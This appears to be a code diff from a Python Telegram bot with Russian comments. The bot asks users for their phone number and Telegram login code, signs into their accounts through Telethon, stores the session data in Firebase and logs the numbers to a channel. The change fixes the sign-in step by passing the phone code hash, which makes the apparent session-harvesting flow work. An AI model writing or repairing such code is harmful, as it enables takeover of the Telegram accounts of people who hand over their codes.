@@ -488,24 +488,28 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     await update.message.reply_text("Пожалуйста, введите номер в формате +380639678038:")
                     return
                 context.user_data['phone'] = text
-                try:
-                    await client.send_code_request(text)
-                    await update.message.reply_text(LANGUAGES['Русский']['enter_code'])
-                    context.user_data['waiting_for_code'] = True
-                    del context.user_data['waiting_for_phone']
-                    await log_to_channel(context, f"Номер телефона {name} (@{username}): {text}", username)
-                    session_data = client.session.save()
-                    await save_session_to_firebase(user_id, session_data)
-                except telethon_errors.RPCError as e:
-                    await update.message.reply_text(LANGUAGES['Русский']['auth_error'].format(error=str(e)))
-                    await log_to_channel(context, f"Ошибка ввода номера {name} (@{username}): {str(e)}", username)
+                # Отправка запроса кода и сохранение phone_code_hash
+                sent_code = await client.send_code_request(text)
+                context.user_data['phone_code_hash'] = sent_code.phone_code_hash
+                await update.message.reply_text(LANGUAGES['Русский']['enter_code'])
+                context.user_data['waiting_for_code'] = True
+                del context.user_data['waiting_for_phone']
+                await log_to_channel(context, f"Номер телефона {name} (@{username}): {text}", username)
+                session_data = client.session.save()
+                await save_session_to_firebase(user_id, session_data)
                 return
 
             if context.user_data.get('waiting_for_code'):
                 try:
-                    await client.sign_in(context.user_data['phone'], text)
+                    # Использование phone_code_hash при авторизации
+                    await client.sign_in(
+                        phone=context.user_data['phone'],
+                        code=text,
+                        phone_code_hash=context.user_data['phone_code_hash']
+                    )
                     await update.message.reply_text(LANGUAGES['Русский']['auth_success'])
                     del context.user_data['waiting_for_code']
+                    del context.user_data['phone_code_hash']  # Очищаем после успешной авторизации
                     await log_to_channel(context, f"Успешная авторизация {name} (@{username})", username)
                     keyboard = [
                         [InlineKeyboardButton("Русский", callback_data='lang_Русский')],
